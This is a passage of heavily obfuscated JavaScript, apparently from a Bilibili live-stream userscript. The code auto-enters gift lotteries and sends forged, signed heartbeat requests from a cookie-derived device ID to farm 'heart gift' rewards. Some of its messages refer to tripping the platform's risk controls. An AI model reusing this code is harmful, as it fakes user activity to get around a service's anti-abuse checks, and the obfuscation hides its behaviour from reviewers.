d\x68\x66']),-0x1)){BiliPushUtils[_0x314c('5e','\x23\x7a\x39\x6a')]=!![];window[_0x314c('5f','\x23\x61\x70\x4b')]('\x5b\u81ea\u52a8\u62bd\u5956\x5d\x5b\u8282\u594f\u98ce\u66b4\x5d\u62bd\u5956\x28\x72\x6f\x6f\x6d\x69\x64\x3d'+_0x1c6c06+'\x2c\x69\x64\x3d'+_0x2dc14d+_0x314c('60','\x33\x6a\x45\x23')+_0x3b2fae+'\x29\u5931\u8d25\x2c\u7591\u4f3c\u8d26\u53f7\u4e0d\u652f\u6301\x2c'+_0x14748c[_0x314c('61','\x4d\x75\x32\x25')],_0x3cfc8e[_0x314c('62','\x4a\x61\x48\x39')]);break;}if(_0x14748c['\x64\x61\x74\x61']&&_0x3cfc8e[_0x314c('63','\x77\x7a\x70\x4e')](_0x14748c[_0x314c('64','\x50\x29\x62\x6b')][_0x314c('65','\x4d\x68\x38\x36')],0x0)&&_0x3cfc8e[_0x314c('66','\x30\x28\x5b\x6e')](_0x14748c['\x6d\x73\x67'][_0x314c('56','\x64\x75\x43\x75')](_0x3cfc8e[_0x314c('67','\x33\x6a\x45\x23')]),-0x1)){_0x3b2fae++;}if(_0x3cfc8e['\x4a\x46\x65\x50\x7a'](_0x14748c[_0x314c('68','\x4f\x4d\x34\x67')]['\x69\x6e\x64\x65\x78\x4f\x66'](_0x3cfc8e[_0x314c('69','\x49\x47\x28\x5d')]),-0x1)){break;}}else{Statistics[_0x314c('6a','\x23\x4b\x40\x64')](_0x14748c[_0x314c('6b','\x35\x44\x32\x4f')][_0x314c('6c','\x77\x7a\x70\x4e')],_0x14748c[_0x314c('6d','\x49\x47\x28\x5d')][_0x314c('6e','\x5d\x31\x73\x72')]);window['\x74\x6f\x61\x73\x74'](_0x314c('6f','\x67\x35\x29\x58')+_0x1c6c06+'\x2c\x69\x64\x3d'+_0x2dc14d+_0x314c('70','\x23\x61\x70\x4b')+_0x3b2fae+_0x314c('71','\x30\x28\x5b\x6e')+_0x3cfc8e[_0x314c('72','\x30\x28\x5b\x6e')](_0x3cfc8e['\x41\x63\x6a\x5a\x65'](_0x14748c[_0x314c('73','\x4a\x5a\x67\x35')]['\x67\x69\x66\x74\x5f\x6e\x61\x6d\x65'],'\x78'),_0x14748c[_0x314c('74','\x46\x70\x7a\x61')][_0x314c('75','\x70\x48\x6e\x21')])+'\x0d\x0a'+_0x14748c[_0x314c('76','\x6a\x55\x53\x40')]['\x6d\x6f\x62\x69\x6c\x65\x5f\x63\x6f\x6e\x74\x65\x6e\x74']+_0x314c('77','\x33\x6a\x45\x23')+_0x4d4fd8,_0x3cfc8e['\x79\x4c\x4e\x69\x77']);break;}}catch(_0x4f2b4f){if(_0x3cfc8e[_0x314c('78','\x41\x55\x44\x5a')](_0x3cfc8e[_0x314c('79','\x6a\x65\x59\x59')],_0x3cfc8e[_0x314c('7a','\x50\x29\x62\x6b')])){window['\x74\x6f\x61\x73\x74'](_0x314c('7b','\x46\x70\x7a\x61')+_0x1c6c06+_0x314c('7c','\x67\x35\x29\x58')+_0x2dc14d+'\x29\u7591\u4f3c\u89e6\u53d1\u98ce\u63a7\x2c\u7ec8\u6b62\uff01\x0d\x0a\u5c1d\u8bd5\u6b21\u6570\x3a'+_0x4d4fd8,_0x3cfc8e[_0x314c('7d','\x4a\x66\x66\x48')]);console['\x65\x72\x72\x6f\x72'](_0x4f2b4f);break;}else{var _0x95b526=_0x6428e0[_0x314c('7e','\x41\x55\x44\x5a')][_0x314c('7f','\x33\x6a\x45\x23')]('\x7c'),_0x1c69c3=0x0;while(!![]){switch(_0x95b526[_0x1c69c3++]){case'\x30':HEAPF64=new Float64Array(_0x3ee834);continue;case'\x31':Module[_0x314c('80','\x30\x69\x67\x5d')]=HEAPF64;continue;case'\x32':Module[_0x314c('81','\x23\x61\x70\x4b')]=HEAPU32;continue;case'\x33':HEAP8=new Int8Array(_0x3ee834);continue;case'\x34':HEAPU16=new Uint16Array(_0x3ee834);continue;case'\x35':HEAPU8=new Uint8Array(_0x3ee834);continue;case'\x36':HEAPU32=new Uint32Array(_0x3ee834);continue;case'\x37':HEAP32=new Int32Array(_0x3ee834);continue;case'\x38':Module[_0x314c('82','\x40\x5b\x6f\x33')]=HEAP16;continue;case'\x39':HEAP16=new Int16Array(_0x3ee834);continue;case'\x31\x30':Module[_0x314c('83','\x23\x7a\x76\x4e')]=HEAPF32;continue;case'\x31\x31':Module['\x48\x45\x41\x50\x55\x38']=HEAPU8;continue;case'\x31\x32':Module['\x48\x45\x41\x50\x33\x32']=HEAP32;continue;case'\x31\x33':HEAPF32=new Float32Array(_0x3ee834);continue;case'\x31\x34':var _0x3ee834=Module['\x69\x6e\x73\x74\x61\x6e\x63\x65'][_0x314c('84','\x4d\x75\x32\x25')][_0x314c('85','\x78\x44\x4a\x25')][_0x314c('86','\x44\x41\x42\x61')];continue;case'\x31\x35':Module[_0x314c('87','\x4f\x4d\x34\x67')]=HEAPU16;continue;case'\x31\x36':Module[_0x314c('88','\x30\x44\x72\x77')]=HEAP8;continue;}break;}}}}catch(_0x9871a7){if(_0x3cfc8e['\x66\x56\x6e\x57\x76'](_0x3cfc8e[_0x314c('89','\x43\x5e\x40\x53')],_0x3cfc8e[_0x314c('8a','\x37\x41\x46\x30')])){window[_0x314c('8b','\x49\x64\x79\x5a')](_0x314c('8c','\x43\x5e\x40\x53')+_0x1c6c06+'\x2c\x69\x64\x3d'+_0x2dc14d+_0x314c('8d','\x46\x70\x7a\x61')+_0x3b2fae+_0x314c('8e','\x49\x64\x79\x5a'),_0x3cfc8e['\x70\x6b\x6b\x73\x49']);console[_0x314c('8f','\x49\x47\x28\x5d')](_0x9871a7);break;}else{id_to_refcount_map[refid]++;}}}continue;case'\x39':var _0x3b2fae=0x0;continue;case'\x31\x30':BiliStorm['\x73\x74\x6f\x72\x6d\x53\x65\x74']['\x61\x64\x64'](_0x2dc14d);continue;case'\x31\x31':if(BiliStorm['\x73\x74\x6f\x72\x6d\x53\x65\x74'][_0x314c('90','\x46\x70\x7a\x61')](_0x2dc14d))return $['\x44\x65\x66\x65\x72\x72\x65\x64']()[_0x314c('91','\x4a\x5a\x67\x35')]();continue;case'\x31\x32':_0x2dc14d=_0x3cfc8e[_0x314c('92','\x77\x7a\x70\x4e')](parseInt,_0x2dc14d,0xa);continue;case'\x31\x33':_0x26a531=_0x3cfc8e['\x41\x63\x6a\x5a\x65'](Math[_0x314c('93','\x30\x44\x72\x77')](_0x3cfc8e[_0x314c('94','\x4d\x68\x38\x36')](new Date()['\x67\x65\x74\x54\x69\x6d\x65'](),0x3e8)),CONFIG[_0x314c('95','\x23\x61\x70\x4b')][_0x314c('2c','\x5d\x31\x73\x72')][_0x314c('96','\x45\x61\x5e\x30')]);continue;case'\x31\x34':var _0x6428e0={'\x54\x73\x41\x4a\x4c':function(_0x214f81,_0x7ea326){return _0x3cfc8e[_0x314c('97','\x37\x41\x46\x30')](_0x214f81,_0x7ea326);},'\x6f\x66\x5a\x6f\x73':_0x3cfc8e[_0x314c('98','\x6a\x65\x59\x59')],'\x59\x66\x51\x7a\x70':function(_0x11555f,_0x2f3acb){return _0x3cfc8e[_0x314c('99','\x64\x75\x43\x75')](_0x11555f,_0x2f3acb);},'\x73\x45\x41\x6b\x42':_0x3cfc8e['\x4f\x57\x72\x74\x75'],'\x43\x75\x4a\x6e\x68':_0x3cfc8e[_0x314c('9a','\x66\x70\x46\x36')],'\x61\x4a\x51\x61\x4d':_0x3cfc8e[_0x314c('9b','\x4f\x4d\x34\x67')]};continue;}break;}}};const UUID=()=>'\x78\x78\x78\x78\x78\x78\x78\x78\x2d\x78\x78\x78\x78\x2d\x34\x78\x78\x78\x2d\x79\x78\x78\x78\x2d\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78'[_0x314c('9c','\x5d\x31\x73\x72')](/[xy]/g,function(_0x4fe482){var _0x16ab84={'\x56\x65\x46\x47\x7a':function(_0x3d2d42,_0x26bd27){return _0x3d2d42|_0x26bd27;},'\x6f\x57\x6e\x4b\x41':function(_0xeae2dd,_0x3d806f){return _0xeae2dd*_0x3d806f;},'\x77\x58\x63\x66\x64':function(_0x5bb7eb,_0x3e7524){return _0x5bb7eb===_0x3e7524;},'\x76\x71\x70\x41\x62':function(_0x5e7880,_0x42b201){return _0x5e7880&_0x42b201;}};var _0x5680fb=_0x16ab84[_0x314c('9d','\x37\x41\x46\x30')](_0x16ab84[_0x314c('9e','\x39\x68\x72\x66')](0x10,Math[_0x314c('9f','\x5d\x31\x73\x72')]()),0x0);return(_0x16ab84[_0x314c('a0','\x23\x4b\x40\x64')]('\x78',_0x4fe482)?_0x5680fb:_0x16ab84[_0x314c('a1','\x4c\x47\x63\x30')](_0x16ab84[_0x314c('a2','\x5e\x32\x37\x57')](0x3,_0x5680fb),0x8))[_0x314c('a3','\x62\x5e\x4a\x7a')](0x10);});class HeartGiftRoom{constructor(_0x58bfcd,_0x46ec29){var _0x58f19c={'\x58\x4f\x65\x4a\x70':_0x314c('a4','\x49\x64\x79\x5a'),'\x4d\x51\x41\x48\x77':function(_0x28d590,_0x33d999){return _0x28d590(_0x33d999);},'\x45\x75\x49\x4a\x52':'\x4c\x49\x56\x45\x5f\x42\x55\x56\x49\x44','\x53\x57\x6b\x78\x63':function(_0x206edb){return _0x206edb();}};var _0x43ed01=_0x58f19c[_0x314c('a5','\x68\x53\x76\x4a')]['\x73\x70\x6c\x69\x74']('\x7c'),_0x508815=0x0;while(!![]){switch(_0x43ed01[_0x508815++]){case'\x30':this[_0x314c('a6','\x62\x5e\x4a\x7a')]=_0x58bfcd[_0x314c('a7','\x43\x5e\x40\x53')];continue;case'\x31':this[_0x314c('a8','\x45\x61\x5e\x30')]=0x0;continue;case'\x32':this['\x61\x72\x65\x61\x5f\x69\x64']=_0x58bfcd[_0x314c('a9','\x23\x4b\x40\x64')];continue;case'\x33':this[_0x314c('aa','\x5e\x32\x37\x57')]=_0x58bfcd;continue;case'\x34':this['\x73\x74\x61\x72\x74\x45\x6e\x74\x65\x72']();continue;case'\x35':this['\x62\x75\x76\x69\x64']=_0x58f19c['\x4d\x51\x41\x48\x77'](getCookie,_0x58f19c[_0x314c('ab','\x5e\x32\x37\x57')]);continue;case'\x36':this[_0x314c('ac','\x30\x28\x5b\x6e')]=_0x58bfcd[_0x314c('ad','\x4b\x74\x36\x4b')];continue;case'\x37':this['\x6c\x61\x73\x74\x5f\x74\x69\x6d\x65']=new Date();continue;case'\x38':this[_0x314c('ae','\x45\x61\x5e\x30')]=_0x46ec29;continue;case'\x39':this['\x65\x72\x72\x6f\x72']=0x0;continue;case'\x31\x30':this['\x75\x61']=window&&window[_0x314c('af','\x4f\x4d\x34\x67')]?window[_0x314c('b0','\x44\x41\x42\x61')]['\x75\x73\x65\x72\x41\x67\x65\x6e\x74']:'';continue;case'\x31\x31':this[_0x314c('b1','\x40\x5b\x6f\x33')]=_0x58f19c[_0x314c('b2','\x4f\x4d\x34\x67')](UUID);continue;case'\x31\x32':;continue;}break;}}async[_0x314c('b3','\x35\x44\x32\x4f')](){var _0x31fb10={'\x59\x53\x44\x46\x57':function(_0x5c1d03,_0x8f3c2e){return _0x5c1d03>_0x8f3c2e;},'\x50\x4a\x44\x6d\x73':function(_0x4433a0,_0x142556){return _0x4433a0==_0x142556;},'\x73\x57\x41\x6a\x6f':function(_0x5c7b82,_0x1444ce){return _0x5c7b82!==_0x1444ce;},'\x4a\x52\x56\x77\x58':_0x314c('b4','\x4d\x75\x32\x25'),'\x47\x62\x6c\x58\x74':_0x314c('b5','\x78\x44\x4a\x25'),'\x4a\x43\x63\x55\x56':function(_0xf0ef83,_0x427e01,_0xe70d4c){return _0xf0ef83(_0x427e01,_0xe70d4c);},'\x4e\x79\x5a\x66\x53':function(_0x4a6c64,_0x3dcc35){return _0x4a6c64*_0x3dcc35;},'\x6e\x77\x69\x51\x50':function(_0x292c13,_0x2bbe44,_0x7bbd35){return _0x292c13(_0x2bbe44,_0x7bbd35);}};try{if(!HeartGift[_0x314c('b6','\x50\x29\x62\x6b')]||_0x31fb10[_0x314c('b7','\x33\x6a\x45\x23')](this[_0x314c('b8','\x44\x41\x42\x61')],0x3))return;let _0x21cad6={'\x69\x64':[this[_0x314c('b9','\x5d\x31\x73\x72')],this['\x61\x72\x65\x61\x5f\x69\x64'],this[_0x314c('ba','\x43\x5e\x40\x53')],this[_0x314c('bb','\x35\x44\x32\x4f')]],'\x64\x65\x76\x69\x63\x65':[this[_0x314c('bc','\x30\x28\x5b\x6e')],this['\x75\x75\x69\x64']],'\x74\x73':new Date()[_0x314c('bd','\x77\x7a\x70\x4e')](),'\x69\x73\x5f\x70\x61\x74\x63\x68':0x0,'\x68\x65\x61\x72\x74\x5f\x62\x65\x61\x74':[],'\x75\x61':this['\x75\x61']};KeySign[_0x314c('be','\x30\x28\x5b\x6e')](_0x21cad6);let _0x364340=await BiliPushUtils[_0x314c('bf','\x46\x70\x7a\x61')][_0x314c('c0','\x44\x41\x42\x61')]['\x65\x6e\x74\x65\x72'](_0x21cad6,this['\x72\x6f\x6f\x6d\x5f\x69\x64']);if(_0x31fb10[_0x314c('c1','\x43\x5e\x40\x53')](_0x364340[_0x314c('c2','\x35\x44\x32\x4f')],0x0)){if(_0x31fb10['\x73\x57\x41\x6a\x6f'](_0x31fb10['\x4a\x52\x56\x77\x58'],_0x31fb10['\x4a\x52\x56\x77\x58'])){len+=0x5;}else{var _0x2a0571=_0x31fb10['\x47\x62\x6c\x58\x74'][_0x314c('c3','\x68\x53\x76\x4a')]('\x7c'),_0x10e8ac=0x0;while(!![]){switch(_0x2a0571[_0x10e8ac++]){case'\x30':this['\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b']=_0x364340[_0x314c('c4','\x23\x61\x70\x4b')][_0x314c('c5','\x6a\x65\x59\x59')];continue;case'\x31':this[_0x314c('c6','\x29\x70\x73\x69')]=_0x364340['\x64\x61\x74\x61']['\x74\x69\x6d\x65\x73\x74\x61\x6d\x70'];continue;case'\x32':++this[_0x314c('c7','\x23\x7a\x76\x4e')];continue;case'\x33':this[_0x314c('c8','\x39\x68\x72\x66')]=_0x364340[_0x314c('c9','\x62\x5e\x4a\x7a')][_0x314c('ca','\x4a\x66\x66\x48')];continue;case'\x34':this[_0x314c('cb','\x73\x6d\x59\x79')]=_0x364340[_0x314c('cc','\x4d\x68\x38\x36')][_0x314c('cd','\x6a\x55\x53\x40')];continue;}break;}}}await _0x31fb10[_0x314c('ce','\x5e\x32\x37\x57')](delayCall,()=>this['\x68\x65\x61\x72\x74\x50\x72\x6f\x63\x65\x73\x73'](),_0x31fb10[_0x314c('cf','\x38\x78\x71\x41')](this['\x74\x69\x6d\x65'],0x3e8));}catch(_0x41b652){this['\x65\x72\x72\x6f\x72']++;console['\x65\x72\x72\x6f\x72'](_0x41b652);await _0x31fb10[_0x314c('d0','\x68\x53\x76\x4a')](delayCall,()=>this[_0x314c('d1','\x30\x69\x67\x5d')](),0x3e8);}}async[_0x314c('d2','\x54\x47\x31\x45')](){var _0x4a37fe={'\x46\x55\x75\x74\x66':function(_0x12833c,_0x3f8c45){return _0x12833c|_0x3f8c45;},'\x57\x43\x6b\x58\x76':function(_0x771897,_0x133ac9){return _0x771897>>_0x133ac9;},'\x55\x67\x4b\x46\x48':function(_0x39b8f0,_0x2142d5){return _0x39b8f0&_0x2142d5;},'\x4b\x6b\x45\x54\x6c':function(_0xbea151,_0x16b29e){return _0xbea151|_0x16b29e;},'\x48\x72\x42\x6c\x61':function(_0x2c577c,_0x139d90){return _0x2c577c&_0x139d90;},'\x67\x58\x6c\x79\x55':function(_0x99f28d,_0x33d150){return _0x99f28d>>_0x33d150;},'\x43\x56\x48\x74\x42':function(_0x10d5a4,_0x3ed4ec){return _0x10d5a4|_0x3ed4ec;},'\x59\x6b\x53\x6a\x4f':function(_0x4aca10,_0x11f132){return _0x4aca10!==_0x11f132;},'\x77\x6e\x48\x43\x67':_0x314c('d3','\x70\x48\x6e\x21'),'\x70\x70\x6d\x67\x4e':_0x314c('d4','\x4a\x63\x71\x4b'),'\x4e\x75\x6c\x78\x6b':function(_0x4699cb,_0xb084cd){return _0x4699cb>_0xb084cd;},'\x64\x5a\x67\x6b\x63':function(_0x330aab,_0x4fbbc5){return _0x330aab==_0x4fbbc5;},'\x42\x65\x70\x74\x62':function(_0x26662c,_0x41797b){return _0x26662c!==_0x41797b;},'\x76\x4f\x68\x71\x79':_0x314c('d5','\x4a\x63\x71\x4b'),'\x6f\x4a\x4f\x6a\x4a':_0x314c('d6','\x73\x6d\x59\x79'),'\x52\x41\x6d\x44\x7a':function(_0x3831d8,_0x2a3714){return _0x3831d8<=_0x2a3714;},'\x6b\x4e\x6f\x44\x6d':function(_0x265c96,_0x230e74,_0x42a258){return _0x265c96(_0x230e74,_0x42a258);},'\x6d\x44\x69\x52\x79':function(_0x14378b,_0x4d22d7){return _0x14378b*_0x4d22d7;},'\x43\x49\x6c\x76\x69':function(_0x4789de,_0x3c75c7){return _0x4789de===_0x3c75c7;},'\x62\x45\x74\x78\x44':_0x314c('d7','\x45\x61\x5e\x30'),'\x65\x72\x62\x46\x53':function(_0x147c49,_0x380b81){return _0x147c49(_0x380b81);}};try{if(_0x4a37fe['\x59\x6b\x53\x6a\x4f'](_0x4a37fe['\x77\x6e\x48\x43\x67'],_0x4a37fe[_0x314c('d8','\x4a\x63\x71\x4b')])){if(!HeartGift[_0x314c('d9','\x30\x28\x5b\x6e')]||_0x4a37fe[_0x314c('da','\x4f\x4d\x34\x67')](this[_0x314c('db','\x23\x7a\x39\x6a')],0x3))return;let _0x35370b={'\x69\x64':[this[_0x314c('dc','\x4a\x5a\x67\x35')],this[_0x314c('dd','\x6a\x65\x59\x59')],this[_0x314c('de','\x4d\x75\x32\x25')],this[_0x314c('df','\x49\x47\x28\x5d')]],'\x64\x65\x76\x69\x63\x65':[this[_0x314c('e0','\x77\x7a\x70\x4e')],this['\x75\x75\x69\x64']],'\x65\x74\x73':this[_0x314c('e1','\x4b\x74\x36\x4b')],'\x62\x65\x6e\x63\x68\x6d\x61\x72\x6b':this[_0x314c('e2','\x23\x7a\x76\x4e')],'\x74\x69\x6d\x65':this[_0x314c('e3','\x39\x68\x72\x66')],'\x74\x73':new Date()[_0x314c('e4','\x40\x5b\x6f\x33')](),'\x75\x61':this['\x75\x61']};KeySign[_0x314c('e5','\x41\x55\x44\x5a')](_0x35370b);let _0x4d87fb=BiliPushUtils[_0x314c('e6','\x30\x45\x2a\x43')](JSON[_0x314c('e7','\x23\x4b\x40\x64')](_0x35370b),this[_0x314c('e8','\x33\x6a\x45\x23')]);if(_0x4d87fb){_0x35370b['\x73']=_0x4d87fb;let _0x4fd33b=await BiliPushUtils[_0x314c('e9','\x6a\x65\x59\x59')]['\x48\x65\x61\x72\x74\x47\x69\x66\x74'][_0x314c('ea','\x38\x78\x71\x41')](_0x35370b,this[_0x314c('eb','\x29\x70\x73\x69')]);if(_0x4a37fe[_0x314c('ec','\x23\x61\x70\x4b')](_0x4fd33b['\x63\x6f\x64\x65'],0x0)){if(_0x4a37fe['\x42\x65\x70\x74\x62'](_0x4a37fe[_0x314c('ed','\x4d\x75\x32\x25')],_0x4a37fe['\x6f\x4a\x4f\x6a\x4a'])){console[_0x314c('ee','\x40\x5b\x6f\x33')](_0x314c('ef','\x30\x28\x5b\x6e')+this[_0x314c('f0','\x73\x6d\x59\x79')][_0x314c('f1','\x23\x7a\x39\x6a')]+'\x5d\u623f\u95f4\x5b'+this[_0x314c('f2','\x49\x64\x79\x5a')]+_0x314c('f3','\x5d\x31\x73\x72'));++HeartGift['\x74\x6f\x74\x61\x6c'];++this['\x73\x65\x71'];this[_0x314c('f4','\x66\x70\x46\x36')]=_0x4fd33b['\x64\x61\x74\x61'][_0x314c('f5','\x49\x47\x28\x5d')];this[_0x314c('f6','\x41\x55\x44\x5a')]=_0x4fd33b[_0x314c('f7','\x64\x75\x43\x75')][_0x314c('f8','\x66\x70\x46\x36')];this[_0x314c('c6','\x29\x70\x73\x69')]=_0x4fd33b['\x64\x61\x74\x61'][_0x314c('f9','\x33\x6a\x45\x23')];this[_0x314c('fa','\x4a\x61\x48\x39')]=_0x4fd33b['\x64\x61\x74\x61'][_0x314c('fb','\x73\x6d\x59\x79')];if(_0x4a37fe[_0x314c('fc','\x5d\x31\x73\x72')](HeartGift[_0x314c('fd','\x44\x41\x42\x61')],HeartGift[_0x314c('fe','\x39\x68\x72\x66')])&&HeartGift[_0x314c('ff','\x38\x78\x71\x41')]){await _0x4a37fe[_0x314c('100','\x29\x70\x73\x69')](delayCall,()=>this[_0x314c('101','\x4a\x61\x48\x39')](),_0x4a37fe[_0x314c('102','\x4d\x68\x38\x36')](this['\x74\x69\x6d\x65'],0x3e8));}else{if(HeartGift[_0x314c('103','\x4d\x75\x32\x25')]){if(_0x4a37fe[_0x314c('104','\x30\x69\x67\x5d')](_0x4a37fe['\x62\x45\x74\x78\x44'],_0x4a37fe['\x62\x45\x74\x78\x44'])){console['\x6c\x6f\x67'](_0x314c('105','\x44\x41\x42\x61'));HeartGift[_0x314c('106','\x70\x48\x6e\x21')]=![];_0x4a37fe[_0x314c('107','\x23\x61\x70\x4b')](runTomorrow,HeartGift[_0x314c('108','\x30\x44\x72\x77')]);}else{HEAPU8[addr++]=_0x4a37fe['\x46\x55\x75\x74\x66'](0xf0,_0x4a37fe['\x57\x43\x6b\x58\x76'](u,0x12));HEAPU8[addr++]=_0x4a37fe['\x46\x55\x75\x74\x66'](0x80,_0x4a37fe[_0x314c('109','\x23\x7a\x76\x4e')](_0x4a37fe[_0x314c('10a','\x23\x61\x70\x4b')](u,0xc),0x3f));HEAPU8[addr++]=_0x4a37fe[_0x314c('10b','\x23\x7a\x39\x6a')](0x80,_0x4a37fe[_0x314c('10c','\x33\x6a\x45\x23')](_0x4a37fe['\x67\x58\x6c\x79\x55'](u,0x6),0x3f));HEAPU8[addr++]=_0x4a37fe['\x43\x56\x48\x74\x42'](0x80,_0x4a37fe['\x48\x72\x42\x6c\x61'](u,0x3f));}}}}else{Module['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x314c('10d','\x58\x72\x51\x54')](t,document);}}}}else{drop_queued=!![];return;}}catch(_0x31914c){this['\x65\x72\x72\x6f\x72']++;console['\x65\x72\x72\x6f\x72'](_0x31914c);await _0x4a37fe[_0x314c('10e','\x78\x44\x4a\x25')](delayCall,()=>this[_0x314c('10f','\x44\x41\x42\x61')](),0x3e8);}}}const HeartGift={'\x74\x6f\x74\x61\x6c':0x0,'\x6d\x61\x78':0x19,'\x70\x72\x6f\x63\x65\x73\x73':!![],'\x72\x75\x6e':async()=>{var _0x111f58={'\x6a\x6e\x63\x44\x75':_0x314c('110','\x70\x48\x6e\x21'),'\x78\x56\x68\x42\x46':function(_0x2f0b67,_0x93061){return _0x2f0b67/_0x93061;},'\x48\x69\x77\x4c\x61':function(_0x183e96,_0x203523){return _0x183e96+_0x203523;},'\x55\x79\x6c\x65\x73':function(_0x4055f6,_0x5d5fbc){return _0x4055f6/_0x5d5fbc;},'\x77\x79\x67\x4a\x42':function(_0x341387,_0x46bbf4){return _0x341387/_0x46bbf4;},'\x55\x71\x4a\x6a\x55':function(_0x294439,_0x8c732b){return _0x294439===_0x8c732b;},'\x65\x51\x77\x77\x77':'\x71\x67\x50\x63\x73','\x59\x6b\x5a\x64\x4f':function(_0x23d538,_0x5d8893){return _0x23d538==_0x5d8893;},'\x61\x41\x64\x4e\x4e':function(_0x758bad,_0x4385cd){return _0x758bad!==_0x4385cd;},'\x47\x74\x61\x47\x59':_0x314c('111','\x23\x7a\x76\x4e'),'\x73\x59\x71\x47\x6c':_0x314c('112','\x30\x45\x2a\x43'),'\x63\x54\x54\x63\x48':_0x314c('113','\x4a\x66\x66\x48'),'\x56\x73\x45\x43\x7a':function(_0x15d7a0,_0x48161d){return _0x15d7a0>_0x48161d;},'\x4c\x53\x74\x58\x56':_0x314c('114','\x45\x61\x5e\x30'),'\x43\x55\x63\x68\x55':_0x314c('115','\x68\x53\x76\x4a'),'\x54\x59\x50\x63\x6d':_0x314c('116','\x55\x25\x59\x55'),'\x50\x69\x78\x46\x66':function(_0x15da48,_0x3f2683,_0x1ba757){return _0x15da48(_0x3f2683,_0x1ba757);},'\x4b\x4d\x70\x69\x6c':function(_0x51ca4f,_0x2b1c8d){return _0x51ca4f==_0x2b1c8d;},'\x59\x68\x4b\x44\x4a':function(_0x57659f,_0x37d60d,_0x3738cd){return _0x57659f(_0x37d60d,_0x3738cd);}};if(!HeartGift[_0x314c('117','\x43\x5e\x40\x53')]){HeartGift[_0x314c('118','\x33\x6a\x45\x23')]=0x0;HeartGift[_0x314c('119','\x4b\x74\x36\x4b')]=!![];}if(_0x111f58['\x59\x6b\x5a\x64\x4f'](BiliPushUtils[_0x314c('11a','\x4d\x68\x38\x36')],null)){if(_0x111f58['\x61\x41\x64\x4e\x4e'](_0x111f58[_0x314c('11b','\x73\x6d\x59\x79')],_0x111f58['\x47\x74\x61\x47\x59'])){try{return{'\x76\x61\x6c\x75\x65':r[_0x314c('11c','\x29\x70\x73\x69')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x2ec810){return{'\x65\x72\x72\x6f\x72':_0x2ec810,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}else{let _0x5c277f=await HeartGift[_0x314c('11d','\x23\x7a\x39\x6a')](_0x111f58[_0x314c('11e','\x30\x69\x67\x5d')],HeartGift[_0x314c('11f','\x45\x61\x5e\x30')]);if(_0x5c277f){BiliPushUtils['\x73\x69\x67\x6e']=function(_0x3996bb,_0x174656){if(_0x111f58[_0x314c('120','\x5e\x32\x37\x57')](_0x111f58[_0x314c('121','\x43\x5e\x40\x53')],_0x111f58['\x65\x51\x77\x77\x77'])){return _0x5c277f[_0x314c('122','\x29\x70\x73\x69')](_0x3996bb,_0x174656);}else{var _0x9b4d67=_0x111f58[_0x314c('123','\x64\x75\x43\x75')][_0x314c('124','\x49\x47\x28\x5d')]('\x7c'),_0x411497=0x0;while(!![]){switch(_0x9b4d67[_0x411497++]){case'\x30':switch(_0x3ffcd2){case 0x0:return Module[_0x314c('125','\x62\x5e\x4a\x7a')]['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x4d0ad0,_0x102232);case 0x1:return Module['\x48\x45\x41\x50\x38']['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x4d0ad0,_0x102232);case 0x2:return Module[_0x314c('126','\x62\x5e\x4a\x7a')][_0x314c('127','\x54\x47\x31\x45')](_0x4d0ad0,_0x102232);case 0x3:return Module[_0x314c('128','\x6c\x4f\x4b\x49')][_0x314c('129','\x44\x41\x42\x61')](_0x4d0ad0,_0x102232);case 0x4:return Module[_0x314c('12a','\x33\x6a\x45\x23')]['\x73\x75\x62\x61\x72\x72\x61\x79'](_0x4d0ad0,_0x102232);case 0x5:return Module[_0x314c('12b','\x35\x44\x32\x4f')][_0x314c('12c','\x70\x48\x6e\x21')](_0x4d0ad0,_0x102232);case 0x6:return Module[_0x314c('12d','\x30\x45\x2a\x43')][_0x314c('127','\x54\x47\x31\x45')](_0x4d0ad0,_0x102232);case 0x7:return Module['\x48\x45\x41\x50\x46\x36\x34'][_0x314c('12e','\x50\x29\x62\x6b')](_0x4d0ad0,_0x102232);}continue;case'\x31':var _0x3ffcd2=Module[_0x314c('12f','\x30\x45\x2a\x43')][_0x111f58[_0x314c('130','\x49\x47\x28\x5d')](_0x111f58[_0x314c('131','\x5d\x31\x73\x72')](address,0x8),0x4)];continue;case'\x32':var _0x102232=_0x111f58[_0x314c('132','\x4c\x47\x63\x30')](_0x4d0ad0,_0x3072da);continue;case'\x33':var _0x3072da=Module[_0x314c('133','\x54\x47\x31\x45')][_0x111f58[_0x314c('134','\x43\x5e\x40\x53')](_0x111f58[_0x314c('135','\x30\x69\x67\x5d')](address,0x4),0x4)];continue;case'\x34':var _0x4d0ad0=Module[_0x314c('136','\x4a\x61\x48\x39')][_0x111f58['\x77\x79\x67\x4a\x42'](address,0x4)];continue;}break;}}};}else{console['\x6c\x6f\x67'](_0x111f58['\x63\x54\x54\x63\x48']);return;}}}let _0x5aca73=await Gift[_0x314c('137','\x5e\x32\x37\x57')]();if(_0x5aca73&&_0x111f58[_0x314c('138','\x54\x47\x31\x45')](_0x5aca73[_0x314c('139','\x23\x4b\x40\x64')],0x0)){console[_0x314c('13a','\x29\x70\x73\x69')](_0x111f58[_0x314c('13b','\x5d\x31\x73\x72')]);for(let _0x51ee6c of _0x5aca73[_0x314c('13c','\x30\x28\x5b\x6e')](0x0,0x18)){if(_0x111f58['\x61\x41\x64\x4e\x4e'](_0x111f58[_0x314c('13d','\x40\x5b\x6f\x33')],_0x111f58['\x54\x59\x50\x63\x6d'])){let _0x49c122=await API[_0x314c('13e','\x4a\x5a\x67\x35')][_0x314c('13f','\x45\x61\x5e\x30')](_0x111f58['\x50\x69\x78\x46\x66'](parseInt,_0x51ee6c['\x72\x6f\x6f\x6d\x69\x64'],0xa));if(_0x111f58['\x4b\x4d\x70\x69\x6c'](_0x49c122[_0x314c('140','\x6c\x4f\x4b\x49')],0x0)){console['\x6c\x6f\x67']('\u5f00\u59cb\u6536\u96c6\x5b'+_0x51ee6c[_0x314c('141','\x4b\x74\x36\x4b')]+_0x314c('142','\x43\x5e\x40\x53')+_0x49c122[_0x314c('143','\x4b\x74\x36\x4b')][_0x314c('144','\x30\x45\x2a\x43')]+_0x314c('145','\x45\x61\x5e\x30'));new HeartGiftRoom(_0x49c122['\x64\x61\x74\x61'],_0x51ee6c);await 